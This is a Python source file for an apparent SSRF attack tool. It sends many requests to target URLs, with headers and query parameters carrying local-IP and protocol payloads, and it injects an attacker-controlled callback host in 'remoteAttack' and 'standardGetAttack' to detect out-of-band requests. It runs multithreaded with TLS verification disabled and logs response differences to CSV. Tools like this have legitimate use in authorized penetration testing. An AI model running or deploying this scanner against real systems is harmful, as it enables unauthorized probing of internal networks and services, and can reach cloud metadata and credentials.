import sys, getopt, os
import queue
import threading
from threading import Thread, Lock
from requests import Request, Session
from requests import ReadTimeout, ConnectTimeout, HTTPError, Timeout, ConnectionError, TooManyRedirects
import urllib3
import ssl
import certifi
import warnings
import json
import re
import csv
from datetime import datetime
from urllib.parse import urlparse
import logging
import random
import colorama
from colorama import Fore, Style
from collections import defaultdict


#sys.stdout.flush()

'''
#TODO: 
- Use cookie received during original request
- add more ip to localipattack file
- use protocol file for attack
- use particularProt file for attack
- add post attack parameter
- add new headers?
- automatically verify remote attack
- order csv by url
- check also response words and line number in difference
- add numbers of url when print Analyzing url
- Speedup script
'''

__version__ = 'version 0.0.1'

num_threads = 40
q = queue.Queue()
lock = Lock()

logger = logging.getLogger('ssrflogger')
#logging.captureWarnings(True)

logging.getLogger("urllib3").setLevel(logging.WARNING)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#context = ssl.create_default_context(cafile=certifi.where())
# Creating a PoolManager instance for sending requests.
http = urllib3.PoolManager(cert_reqs='CERT_NONE', num_pools=50) #valutare di spostare
timeout = 2
retries = False


backurl = ""
parameters = []
cloudParameters = []
standardGetParameters = []
headers = []
cookies = []
protocols = []
debugMode = False

nrTotUrls = 0
nrUrlsAnalyzed = 0
nrErrorUrl = 0

outputFilename = datetime.now().strftime("%Y_%m_%d-%I_%M_%S_%p")
completeFileName = "output/"+outputFilename+".txt"
completeFileNameCSV = "output/"+outputFilename+".csv"
os.makedirs(os.path.dirname(completeFileName), exist_ok=True)

#Initialize colorama
colorama.init(autoreset=True)



def printBanner():
    print("""

            ░██████╗░██████╗██████╗░███████╗
            ██╔════╝██╔════╝██╔══██╗██╔════╝
            ╚█████╗░╚█████╗░██████╔╝█████╗░░
            ░╚═══██╗░╚═══██╗██╔══██╗██╔══╝░░
            ██████╔╝██████╔╝██║░░██║██║░░░░░
            ╚═════╝░╚═════╝░╚═╝░░╚═╝╚═╝
    """)
    print(__version__ + " by Dancas")
    print(Fore.YELLOW + "[WRN] Use with caution. You are responsible for your actions")
    print(Fore.YELLOW + "[WRN] Developers assume no liability and are not responsible for any misuse or damage.")

def printHelp():
    print(Fore.GREEN + "Displaying Help Menu")
    print(Fore.GREEN + "Welcome in SSRF tools developed by Daniele")
    print(Fore.GREEN + "Use -h or --help to print this message")
    print(Fore.GREEN + "Use -u or --url to insert a single url to analyze")
    print(Fore.GREEN + "Use -f or --file to insert a list of url to analyze")
    print(Fore.GREEN + "Use -b or --backurl to insert the back connection that will be launched if attack goes well")
    print(Fore.GREEN + "Use -c or --cookies to insert the cookies")
    print(Fore.GREEN + "Use -d or --debug to enable debug mode. Debug mode will print eventualy error message (Default False)")
    print(Fore.GREEN + "Example: python3 ssrf.py -u https://google.com -b test1.free.beeceptor.com")
    print(Fore.GREEN + "Example: python3 ssrf.py -f urls.txt -b test1.free.beeceptor.com")

def checkInputParameter():
    parameters = {}
    argumentList = sys.argv[1:]
    
    if(len(argumentList)==0):
        printHelp()
        exit(1)

    # Options
    options = "h:u:b:f:c:d:"
    # Long options
    long_options = ["help", "url", "backurl", "file", "cookies", "debug"]
     
    try:
        # Parsing argument
        arguments, values = getopt.getopt(argumentList, options, long_options)

        
        # checking each argument
        for currentArgument, currentValue in arguments:
            if currentArgument in ("-h", "--help"):
                printHelp()

            elif currentArgument in ("-u", "--url"):
                parameters['url'] = currentValue

            elif currentArgument in ("-b", "--backurl"):
                global backurl 
                backurl = currentValue

            elif currentArgument in ("-f", "--file"):
                parameters['filename'] = currentValue

            elif currentArgument in ("-c", "--cookies"):
                global cookies
                cookies = currentValue

            elif currentArgument in ("-d", "--debug"):
                global debugMode
                debugMode = True

    except getopt.error as err:
        # output error, and return with an error code
        print(Fore.RED + str(err))
        exit(1)

    if('url' not in parameters.keys() and 'filename' not in parameters.keys()):
        print(Fore.RED + "Error: You must set at least an url od file with valid urls")
        exit(1)


    return parameters

def loadFiles():
    global headers
    global parameters
    global protocols
    global cloudParameters
    with open('utils/headers.txt') as file:
        while line := file.readline():
            header = line.rstrip()
            headers.append(header)

    with open('utils/localIPAttack.txt') as file:
        while line := file.readline():
            parameter = line.rstrip()
            parameters.append(parameter)

    with open('utils/standardGetParameters.txt') as file:
        while line := file.readline():
            getParameter = line.rstrip()
            standardGetParameters.append(getParameter)

    with open('utils/protocols.txt') as file:
        while line := file.readline():
            protocol = line.rstrip()
            protocols.append(protocol)
            
    '''
    with open('utils/cloud.txt') as file:
        while line := file.readline():
            cloudParameter = line.rstrip()
            cloudParameters.append(cloudParameter)
    '''

def checkDifferenceinResponse(response1, response2):
    respose1Status = response1.status
    respose2Status = response2.status
    respose1Size = sys.getsizeof(response1.data)
    respose2Size = sys.getsizeof(response2.data)
    response1Words = len(str(response1).split())
    response2Words = len(str(response2).split())
    if(respose1Status!=respose2Status or (respose1Size!=respose2Size and response1Words!=response2Words)):
        return True
    return False

def checkIfLogResult(originalResponse, response, tempResponses, logInfo):
    if(checkDifferenceinResponse(originalResponse, response)):
        '''
        logInfo['ResponseCode']=str(response.status)
        logInfo['ResponseSize']=str(sys.getsizeof(response.data))
        tempResponses.append(logInfo)
        '''
        responseCode = str(response.status)
        responseSize = str(sys.getsizeof(response.data))
        listResponse = tempResponses.get(responseCode)
        if(listResponse):
            if(responseSize not in listResponse):
                tempResponses[responseCode] = listResponse + [responseSize]
                logInfo['ResponseCode']=responseCode
                logInfo['ResponseSize']=responseSize
                logResult(logInfo) 
        else:
            tempResponses[responseCode]=[responseSize]
            logInfo['ResponseCode']=responseCode
            logInfo['ResponseSize']=responseSize
            logResult(logInfo) 
        
def headersScan(url, method, badHeaders="", originalUrl=""):
    if(originalUrl==""):
        originalUrl = getHostnameFromUrl(url)
    else:
        originalUrl = getHostnameFromUrl(originalUrl)
    headers = {}
    goodHeaders = {
                'Accept-Encoding' : 'gzip, deflate',
                'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'Connection': 'keep-alive',
                'MyHeader': originalUrl,
                'Host': originalUrl
              }


    if(badHeaders!=""):
        headers.update(goodHeaders)
        headers.update(badHeaders)
    else:
        headers=goodHeaders

    global cookies
    if cookies != []:
        tempCookie = {'Cookie' : cookies}
        headers.update(tempCookie)

    global http
    try:
        resp = http.request(method, url, headers=headers, timeout=timeout, retries=retries)
        #print(resp.getheader('Set-Cookie'))
        return resp
    except Exception as e:
        if(debugMode):
            logger.error(Fore.RED+'Exception: '+ str(e))
        else:
            pass
    return None

def localAttack(url, originalResponse):
    tempResponses = {}
    #tempResponses = []
    for header in headers:
        for parameter in parameters:
            badHeader = {header:parameter}
            #print(str(badHeader))
            response = headersScan(url,'GET', badHeaders=badHeader)
            logInfo = {
                    'Hostname': url, 
                    'HeaderField': header, 
                    'HeaderValue': parameter, 
                    'ResponseCode':'Error',
                    'ResponseSize':'Error',
                    'OriginalCode': str(originalResponse.status),
                    'OriginalSize': str(sys.getsizeof(originalResponse.data))}
            if(response!=None):
                checkIfLogResult(originalResponse, response, tempResponses, logInfo)
                    

    # log results
    '''
    logInfos = compatLogInfo(tempResponses)
    for logInfo in logInfos:
        logResult(logInfo) 
   ''' 

def standardGetAttack(url):
    global standardGetParameters
    global backurl
    for getParameter in standardGetParameters:
        newUrl = url+getParameter+backurl
        rndm = random.randint(0,9999999)
        testoLog = str(rndm)+":"+newUrl
        writeToLog(testoLog)
        headersScan(newUrl,'GET')

def remoteAttack(url):
    global headers
    global backurl
    for header in headers:
        rndm = random.randint(0,9999999)
        badHeader = {header:str(rndm)+"."+backurl}
        writeToLog(str(badHeader)+str(url))
        headersScan(url,'GET', badHeaders=badHeader)
    #verifyRemoteAttack()

def performAllAttack(url):
    originalResponse = headersScan(url,'GET')
    
    if(originalResponse != None):
        #lock.acquire()
        #print("Analyzing URL", url)
        #lock.release()

        #protocolAttack(url, originalResponse) #TODO: Da Valutare
        localAttack(url, originalResponse)
        global backurl 
        if(backurl!=""):
            remoteAttack(url)
            standardGetAttack(url)
    else:
        global nrErrorUrl
        lock.acquire()
        nrErrorUrl += 1
        print(f"Url Analyzing {nrUrlsAnalyzed}/{nrTotUrls} and we got {nrErrorUrl} error", end='\r')
        if(debugMode):
            print(Fore.RED + "Connection error with url: ",url)
        lock.release()

def getHostnameFromUrl(url):
    return urlparse(url).netloc

def writeToLog(testo):
    lock.acquire()
    with open(completeFileName, "a") as file_object:
        file_object.write(testo+"\n")
    lock.release()

def writeToCSV(row):
    lock.acquire()
    # field names 
    fields = ['Hostname', 'HeaderField', 'HeaderValue', 'ResponseCode','ResponseSize', 'OriginalCode' , 'OriginalSize']
    with open(completeFileNameCSV, 'a') as csvfile: 
        csvwriter = csv.DictWriter(csvfile,fieldnames = fields) 

        if csvfile.tell() == 0:
            # writing the fields 
            csvwriter.writeheader() 
            
        # writing the data rows 
        csvwriter.writerow(row)
    lock.release()
    

def logResult(info):
    writeToCSV(info)


def scanFile(filename):
    with open(filename) as file:
        while line := file.readline():
            url = line.rstrip()
            q.put(str(url)) #multithreading
            global nrTotUrls
            nrTotUrls += 1
            #scanUrl(url)
    global num_threads
    for i in range(num_threads):
        worker = Thread(target=scanUrls, daemon=True).start()
        #worker.start()
    q.join()

def scanUrl(url):
    performAllAttack(url)

def scanUrls():
    global q
    global nrUrlsAnalyzed
    global nrErrorUrl
    while not q.empty():
        #print(threading.get_ident())
        try:
            url = q.get()
            nrUrlsAnalyzed += 1
            printAnalyzingMessage()
            performAllAttack(url)
            q.task_done() #TODO: verificare se corretto
        except Exception as e:
            #lock.acquire()
            #print(Fore.RED +"Exception : " + str(e))
            nrErrorUrl += 1
            printAnalyzingMessage()
            q.task_done() #TODO: verificare se corretto
            #print(f"Url Analyzing {nrUrlsAnalyzed}/{nrTotUrls} and we got {nrErrorUrl} error", end='\r')
            #lock.release()
            #pass
    printAnalyzingMessage()

def printAnalyzingMessage():
    lock.acquire()
    print(f"Url Analyzing {nrUrlsAnalyzed}/{nrTotUrls} and we got {nrErrorUrl} error", end='\r')
    lock.release()


def main():
    printBanner()
    parameters = checkInputParameter()
    url = parameters.get('url')
    filename = parameters.get('filename')
    loadFiles()
    #backurl = getBackUrlFromPingb()
    if(url):
        scanUrl(url)
    elif(filename):
        scanFile(filename)
    
if __name__ == "__main__":
    main()